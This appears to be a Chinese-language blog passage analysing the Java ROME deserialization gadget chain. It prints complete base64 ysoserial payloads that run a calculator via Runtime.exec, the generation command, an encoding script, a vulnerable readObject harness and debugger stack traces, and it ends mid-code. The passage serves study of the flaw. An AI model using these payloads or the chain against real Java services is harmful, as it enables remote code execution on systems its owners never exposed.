<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXP=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB%<span class="number">2</span>BAAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA<span class="comment">/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8%2BAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ%2BAQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMjEzOTMzNjQzODY5MzA0AQAgTHlzb3NlcmlhbC9Qd25lcjIxMzkzMzY0Mzg2OTMwNDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA%2BnAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB%2BABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu%2BX2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB%2BAAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB%2BAB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB%2BACNxAH4ADXEAfgAGcQB%2BAAZxAH4ABng%3D</span></span><br></pre></td></tr></table></figure></div>

<p>base64 编码可以直接用 kali 自带的：<code>java -jar ./ysoserial-all.jar ROME &#39;calc.exe | base64 &gt; payload.txt</code> ，再丢进 cyberchef 中 URL 编码即可。或者将得到的字节数据重定向到文件中，用以下脚本进行编码处理：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">filename = <span class="string">&quot;./res.bin&quot;</span></span><br><span class="line">s = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">base64_str = base64.b64encode(s)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;base64.txt&quot;</span>, <span class="string">&quot;wt&quot;</span>, encoding = <span class="string">&quot;utf-8&quot;</span>).write(parse.quote(base64_str.decode()))</span><br><span class="line"><span class="comment"># open(&quot;base64.txt&quot;, &quot;wt&quot;, encoding = &quot;utf-8&quot;).write(base64_str.decode())</span></span><br></pre></td></tr></table></figure></div>

<p>base64 库有另一个 b64 编码方法：<code>urlsafe_b64encode()</code> ，该方法生成的 payload 传入后会导致 JAVA 报错 base64 编码内容 </p>
<hr>
<p> 在 powershell 下用 ysoserial 生成 payload 会有问题，原因是 powershell 不支持字节流重定向，ysoserial 输出的内容被重定向时会被当作字符串处理，经过解码、编码后数据会有损失（pwoershell 默认是 ANSI 编码，但不论什么编码都会导致数据的损失）。也正是其输出的内容无法被当作字符串处理的原因，直接复制粘贴工具在终端输出的内容或者将输出内容重定向至文件再复制粘贴都无法得到完整有效的 payload。具体表现为如果是真正有效的 payload，复制粘贴时只会复制前面一小部分；而能完整复制下来的 payload 字节内容都是有误的。</p>
<p>Bash 可以重定向字节流，甚至可以用 base64 直接对输出的字节数据编码，因此在 linux 下用该工具基本能得到正确内容。</p>
<p>Kali 下运行获得的正确的 payload 字节流数据头：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.cos.ap-shanghai.myqcloud.com/2023/Snipaste_2023-10-31_10-43-31.png"
                     
                ></p>
<p>使用 powershell 重定向至文件后获得的错误的字节流数据头：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.cos.ap-shanghai.myqcloud.com/2023/image-20231031104900799.png"
                      alt="image-20231031104900799"
                ></p>
<p>上述错误的字节流数据传入 JAVA 的反序列化函数会报错：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.StreamCorruptedException: invalid stream header: EE848800</span><br></pre></td></tr></table></figure></div>

<hr>
<p>ROME 链条解析：在 <code>ysoserial/src/main/java/ysoserial/payloads/ROME</code> 的源码中可以看到 ROME 的利用链条：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">* NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* Method.invoke(Object, Object...)</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure></div>

<h4 id="利用链调试"><a href="#利用链调试" class="headerlink" title="利用链调试"></a>利用链调试</h4><p><em>参考：<a class="link"   target="_blank" rel="noopener" href="https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" >ROME 反序列化漏洞分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p>
<p>在本地搭建 ROME 测试环境，IDEA 新建一个 Maven 项目，archType 勾选 WebApp，在 pom.xml 中引入 ROME 依赖：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>新建测试类：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> myremo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoEntry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64_exp</span> <span class="operator">=</span> <span class="string">&quot;Base64_String&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] exp = Base64.getDecoder().decode(base64_exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Base64_String</code> 替换为以下测试 payload：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA<span class="comment">/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAbAyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAKG9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB95c29zZXJpYWwvUHduZXI3NDM4Nzc3OTA0NjI5MDc5AQAhTHlzb3NlcmlhbC9Qd25lcjc0Mzg3Nzc5MDQ2MjkwNzk7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALgAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAMwAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAANwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAXAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADsADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhzcgAoY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuRXF1YWxzQmVhbvWKGLvl9hgRAgACTAAKX2JlYW5DbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7TAAEX29ianEAfgAJeHB2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwcQB+ABRzcgAqY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuVG9TdHJpbmdCZWFuCfWOSg8j7jECAAJMAApfYmVhbkNsYXNzcQB+ABxMAARfb2JqcQB+AAl4cHEAfgAfcQB+ABRzcQB+ABt2cQB+AAJxAH4ADXNxAH4AIHEAfgAjcQB+AA1xAH4ABnEAfgAGcQB+AAZ4</span></span><br></pre></td></tr></table></figure></div>

<p>如果用的 IDEA，在 External Libraries 中的 <code>rome-1.0.jar/com.sun.syndication/feed/impl/ObjectBean</code> 类的 <code>hashcode()</code> 函数中下断点，回到主函数启动调试即可来到反序列化的入口点，到达最终利用点时的函数栈情况如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">getTransletInstance:<span class="number">452</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">485</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">506</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)	<span class="comment">// A2</span></span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">120</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)	<span class="comment">// A1</span></span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">340</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">1419</span>, HashMap (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1185</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2345</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2236</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1692</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">508</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">466</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">14</span>, RemoEntry (myremo)</span><br></pre></td></tr></table></figure></div>

<p>最终利用的点是：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">       <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();	<span class="comment">// A3</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">           <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">           <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                   _class[_transletIndex].getConstructor().newInstance();	<span class="comment">// A5</span></span><br><span class="line">           translet.postInitialization();</span><br><span class="line">           translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">           